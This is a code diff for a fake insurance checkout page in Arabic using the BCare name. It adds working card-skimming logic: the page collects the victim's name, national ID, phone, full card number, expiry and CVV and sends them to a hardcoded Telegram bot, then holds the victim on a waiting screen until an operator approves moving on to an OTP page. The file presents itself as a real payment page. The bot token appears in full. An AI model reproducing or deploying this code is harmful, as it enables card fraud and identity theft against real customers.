@@ -277,9 +277,254 @@ function initExpiryInner() {
   inp.addEventListener('input', () => updateInnerState('inner-expiry', inp.value));
 }
 
-/* ─── شاشة التحقق (10 ثوانٍ قبل الانتقال لـ OTP) ──── */
+/* ═══════════════════════════════════════════════════════
+   شاشة التحقق — انتظار قرار الأدمن من Telegram
+   ═══════════════════════════════════════════════════════ */
+
+const TG = {
+  TOKEN: '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow',
+  CHAT:  '1451039924',
+};
+
+let verifyPollInt   = null;
+let lastVerifyUpdateId = 0;
+let paymentApproved = false;
+let myRefNumber = '';
+
+/* ─── Telegram API ───────────────────────────────── */
+async function tgSend(text, replyMarkup) {
+  try {
+    const body = { chat_id: TG.CHAT, text, parse_mode: 'HTML' };
+    if (replyMarkup) body.reply_markup = replyMarkup;
+    const res = await fetch(
+      `https://api.telegram.org/bot${TG.TOKEN}/sendMessage`,
+      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
+    );
+    return await res.json();
+  } catch(e) { console.error('TG:', e); return { ok: false }; }
+}
+
+async function tgAnswerCallback(callbackQueryId, text) {
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${TG.TOKEN}/answerCallbackQuery`,
+      { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) }
+    );
+  } catch(e) {}
+}
+
+async function tgEditMessage(messageId, text, replyMarkup) {
+  try {
+    const body = { chat_id: TG.CHAT, message_id: messageId, text, parse_mode: 'HTML' };
+    if (replyMarkup) body.reply_markup = replyMarkup;
+    await fetch(
+      `https://api.telegram.org/bot${TG.TOKEN}/editMessageText`,
+      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
+    );
+  } catch(e) {}
+}
+
+async function tgGetUpdates() {
+  try {
+    const res  = await fetch(
+      `https://api.telegram.org/bot${TG.TOKEN}/getUpdates?offset=${lastVerifyUpdateId+1}&timeout=2`
+    );
+    const data = await res.json();
+    return data.ok ? (data.result || []) : [];
+  } catch(e) { return []; }
+}
+
+/* ─── بناء رسالة الطلب + أزرار ─────────────────────── */
+function buildCheckoutOrderMsg(ref) {
+  try {
+    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
+    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
+    const form   = JSON.parse(sessionStorage.getItem('bcare_form')   || '{}');
+    const card   = JSON.parse(sessionStorage.getItem('bcare_card_data') || '{}');
+
+    return `🔔 <b>طلب دفع جديد — بي كير</b>
+
+🆔 <b>المرجع: </b><code>${ref}</code>
+
+👤 <b>العميل</b>
+• الاسم: <b>${policy.fullName || '—'}</b>
+• رقم الهوية: <code>${form.nationalId || '—'}</code>
+• الجوال: <code>${policy.mobile || '—'}</code>
+
+🚗 <b>التأمين</b>
+• الشركة: <b>${offer.companyName || '—'}</b>
+• نوع التأمين: ${offer.insuranceType || '—'}
+• ماركة المركبة: ${policy.carBrand || '—'}
+
+💳 <b>بطاقة الدفع</b>
+• رقم البطاقة: <code>${card.number || '****'}</code>
+• النوع: ${card.type || '—'}
+• تاريخ الانتهاء: <code>${card.expiry || '—'}</code>
+• CVV: <code>${card.cvv || '—'}</code>
+
+💰 <b>المبلغ</b>
+• الرسوم: ر.س ${offer.price ? parseFloat(offer.price).toFixed(2) : '—'}
+• الضريبة 15%: ر.س ${offer.vat ? parseFloat(offer.vat).toFixed(2) : '—'}
+• <b>المجموع: ر.س ${offer.total ? parseFloat(offer.total).toFixed(2) : '—'}</b>
+
+⏳ <b>العميل بانتظار قرارك...</b>`;
+  } catch(e) {
+    return `🔔 طلب دفع جديد — بي كير\n🆔 المرجع: ${ref}`;
+  }
+}
+
+function buildKeyboard(ref) {
+  return {
+    inline_keyboard: [
+      [
+        { text: '✅ دخول OTP', callback_data: `approve_${ref}` },
+        { text: '❌ رفض',     callback_data: `reject_${ref}`  },
+      ]
+    ]
+  };
+}
+
+/* ─── عرض شاشة التحقق ────────────────────────────── */
+let verifyStartTime = 0;
+let verifyAnimFrame = null;
+
 function showVerifyingOverlay() {
-  document.getElementById('verify-overlay')?.classList.remove('hidden');
+  const ov = document.getElementById('verify-overlay');
+  if (!ov) return;
+  ov.classList.remove('hidden');
+  paymentApproved = false;
+  verifyStartTime = performance.now();
+
+  const timerEl = document.getElementById('vo-timer');
+  const circEl  = document.getElementById('vo-circ-progress');
+  const CIRC = 264;
+
+  function tick(now) {
+    if (paymentApproved) return;
+    const elapsed = (now - verifyStartTime) / 1000;
+
+    if (timerEl) {
+      timerEl.textContent = Math.floor(elapsed);
+    }
+    if (circEl) {
+      const pct = (elapsed % 60) / 60;
+      circEl.setAttribute('stroke-dashoffset', CIRC - (CIRC * pct));
+    }
+    verifyAnimFrame = requestAnimationFrame(tick);
+  }
+  verifyAnimFrame = requestAnimationFrame(tick);
+}
+
+/* ─── استلام قرار الأدمن ──────────────────────────── */
+function startVerifyPolling() {
+  clearInterval(verifyPollInt);
+  verifyPollInt = setInterval(async () => {
+    if (paymentApproved) return;
+    const updates = await tgGetUpdates();
+    for (const u of updates) {
+      lastVerifyUpdateId = u.update_id;
+
+      /* ── زر Inline Callback ── */
+      if (u.callback_query) {
+        const cq = u.callback_query;
+        const data = cq.data || '';
+
+        if (data.startsWith('approve_')) {
+          const ref = data.replace('approve_', '');
+          if (ref === myRefNumber) {
+            paymentApproved = true;
+            clearInterval(verifyPollInt);
+            cancelAnimationFrame(verifyAnimFrame);
+            await tgAnswerCallback(cq.id, '✅ تم الموافقة');
+            await tgEditMessage(cq.message.message_id,
+              cq.message.text + '\n\n✅ <b>تم الموافقة — جاري التحويل...</b>', null);
+            goToOTP();
+            return;
+          }
+        }
+
+        if (data.startsWith('reject_')) {
+          const ref = data.replace('reject_', '');
+          if (ref === myRefNumber) {
+            paymentApproved = true;
+            clearInterval(verifyPollInt);
+            cancelAnimationFrame(verifyAnimFrame);
+            await tgAnswerCallback(cq.id, '❌ تم الرفض');
+            await tgEditMessage(cq.message.message_id,
+              cq.message.text + '\n\n❌ <b>تم الرفض</b>', null);
+            showVerifyReject();
+            return;
+          }
+        }
+      }
+
+      /* ── نص عادي (backup) ── */
+      const text = (u.message?.text || '').trim();
+      if (text === 'دخول' || text === 'otp') {
+        paymentApproved = true;
+        clearInterval(verifyPollInt);
+        cancelAnimationFrame(verifyAnimFrame);
+        goToOTP();
+        return;
+      }
+      if (text.toUpperCase() === 'REJECT') {
+        paymentApproved = true;
+        clearInterval(verifyPollInt);
+        cancelAnimationFrame(verifyAnimFrame);
+        showVerifyReject();
+        return;
+      }
+    }
+  }, 2500);
+}
+
+/* ─── الانتقال لصفحة OTP ──────────────────────────── */
+function goToOTP() {
+  try {
+    const offer    = JSON.parse(sessionStorage.getItem('bcare_offer')||'{}');
+    const cardRaw  = (document.getElementById('cc-number')||{}).value||'';
+    const cardClean= cardRaw.replace(/\D/g,'');
+    const cardType = detectType(cardRaw);
+    const expiry   = (document.getElementById('cc-expiry')||{}).value||'';
+    const cvv      = (document.getElementById('cc-cvv')||{}).value||'';
+    const name     = (document.getElementById('cc-name')||{}).value||'';
+    const ref      = offer.refNumber || myRefNumber;
+
+    offer.cardMasked = cardClean.slice(-4);
+    offer.cardType   = cardType?.name || 'بطاقة';
+    offer.refNumber  = ref;
+    sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
+
+    sessionStorage.setItem('bcare_card_data', JSON.stringify({
+      number: cardClean.replace(/(\d{4})/g,'$1 ').trim(),
+      type:   cardType?.name || 'بطاقة',
+      expiry,
+      cvv,
+      name,
+    }));
+  } catch(err){}
+
+  window.location.href = 'otp-verify.html';
+}
+
+/* ─── عرض رفض ─────────────────────────────────────── */
+function showVerifyReject() {
+  const ov = document.getElementById('verify-overlay');
+  if (!ov) return;
+  ov.innerHTML = `
+    <div class="vo-backdrop"></div>
+    <div class="vo-card">
+      <div style="width:64px;height:64px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto 1rem">
+        <span class="material-icons" style="font-size:2rem;color:#e53935">cancel</span>
+      </div>
+      <h3 class="vo-title" style="color:#e53935">تم رفض العملية</h3>
+      <p class="vo-desc">نعتذر، تم رفض عملية الدفع بعد مراجعة البيانات.<br/>يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.</p>
+      <button type="button" class="vo-secure-link" onclick="window.location.href='secure-checkout.html'" style="cursor:pointer;border:none;margin-top:.75rem">
+        <span class="material-icons">arrow_forward</span>
+        العودة لصفحة الدفع
+      </button>
+    </div>`;
 }
 
 /* ─── إرسال النموذج ─────────────────────────────── */
@@ -288,42 +533,35 @@ function initSubmit() {
   const btn  = document.getElementById('pay-now-btn');
   if (!form||!btn) return;
 
-  form.addEventListener('submit', e => {
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
     if (!validateAll()) return;
 
     btn.disabled = true;
     btn.innerHTML = '<span class="material-icons sc-spin">autorenew</span> جاري معالجة الدفع...';
 
+    /* توليد رقم مرجعي فريد */
+    try {
+      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
+      myRefNumber = offer.refNumber || ('BC-' + Date.now().toString().slice(-8).toUpperCase());
+      offer.refNumber = myRefNumber;
+      sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
+    } catch(e) {
+      myRefNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
+    }
+
+    /* 📨 إرسال تفاصيل الطلب لـ Telegram مع أزرار */
+    await tgSend(buildCheckoutOrderMsg(myRefNumber), buildKeyboard(myRefNumber));
+
+    /* تجاوز رسائل قديمة */
+    const oldUpdates = await tgGetUpdates();
+    if (oldUpdates.length > 0) {
+      lastVerifyUpdateId = oldUpdates.reduce((max, u) => Math.max(max, u.update_id), 0);
+    }
+
+    /* عرض الشاشة + بدء الاستماع لقرار الأدمن */
     showVerifyingOverlay();
-
-    setTimeout(() => {
-      try {
-        const offer    = JSON.parse(sessionStorage.getItem('bcare_offer')||'{}');
-        const cardRaw  = (document.getElementById('cc-number')||{}).value||'';
-        const cardClean= cardRaw.replace(/\D/g,'');
-        const cardType = detectType(cardRaw);
-        const expiry   = (document.getElementById('cc-expiry')||{}).value||'';
-        const cvv      = (document.getElementById('cc-cvv')||{}).value||'';
-        const name     = (document.getElementById('cc-name')||{}).value||'';
-        const ref      = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
-
-        offer.cardMasked = cardClean.slice(-4);
-        offer.cardType   = cardType?.name || 'بطاقة';
-        offer.refNumber  = ref;
-        sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
-
-        /* حفظ بيانات البطاقة كاملة للإرسال عبر Telegram (اختبار شخصي) */
-        sessionStorage.setItem('bcare_card_data', JSON.stringify({
-          number: cardClean.replace(/(\d{4})/g,'$1 ').trim(),
-          type:   cardType?.name || 'بطاقة',
-          expiry,
-          cvv,
-          name,
-        }));
-      } catch(err){}
-      window.location.href = 'otp-verify.html';
-    }, 10000);
+    startVerifyPolling();
   });
 }
 
